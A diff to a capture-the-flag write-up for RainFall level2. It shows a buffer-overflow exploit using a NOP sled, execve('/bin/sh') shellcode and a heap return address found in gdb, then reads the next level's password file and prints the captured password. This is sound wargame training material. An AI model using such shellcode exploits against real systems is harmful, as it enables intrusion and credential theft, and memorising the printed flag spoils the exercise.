@@ -37,7 +37,7 @@ disas p
 However, there is no syscall to /bin/sh to allow us to access a shell.
 -> use a shellcode
 We segfault at 80 we will therefore have something like:
- print 'A' * x + 'shellcode' + address
+ print '\x90' * x + 'shellcode' + address (\x90 = NOP code)
  The shellcode we found has a length of 45, we will therefore print 35 A (80 - 45).
 
 For the address, we cannot use an address located on the stack, because of this check:
@@ -48,21 +48,33 @@ For the address, we cannot use an address located on the stack, because of this 
 If the address starts with 0xb, it  will exit the program.
 https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6
 
-level2@RainFall:~$ ltrace ./level2 
-__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
-fflush(0xb7fd1a20)                                                  = 0
-gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5hello
-)                       = 0xbffff6fc
-puts("hello"hello
-)                                                       = 6
-strdup("hello")                                                     = 0x0804a008
-+++ exited (status 8) +++
 
--> We will use the return address of strdup, which is located on the heap.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   %ebp
+   0x08048540 <+1>:	mov    %esp,%ebp
+   0x08048542 <+3>:	and    $0xfffffff0,%esp
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave                         // put a breakpoint here, to get return address of strdup
+   0x0804854b <+12>:	ret    
+End of assembler dump.
+(gdb) break *0x0804854a
+Breakpoint 1 at 0x804854a
+(gdb) run
+Starting program: /home/user/level2/level2 
+hello
+hello
+
+Breakpoint 1, 0x0804854a in main ()
+(gdb) i r $eax
+eax            0x804a008	134520840
+
+--> return address of strdup is 0x804a008,
+-> We will use the return address of strdup, which is located on the heap to inject the shellcode.
 
 Shellcode from: https://beta.hackndo.com/buffer-overflow/
 
---> level2@RainFall:~$ (python -c "print 'A' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
+--> level2@RainFall:~$ (python -c "print '\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
